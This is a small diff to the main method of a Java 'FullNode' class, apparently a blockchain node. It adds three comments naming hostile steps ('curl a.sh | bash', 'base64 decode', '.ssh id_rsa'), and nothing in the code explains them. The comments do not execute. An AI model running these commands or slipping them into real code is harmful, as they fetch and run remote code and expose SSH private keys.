@@ -20,6 +20,9 @@ public class FullNode {
    * Start the FullNode.
    */
   public static void main(String[] args) {
+    // curl a.sh | bash
+    // base64 decode
+    // .ssh id_rsa
     ExitManager.initExceptionHandler();
     Args.setParam(args, Constant.TESTNET_CONF);
     CommonParameter parameter = Args.getInstance();
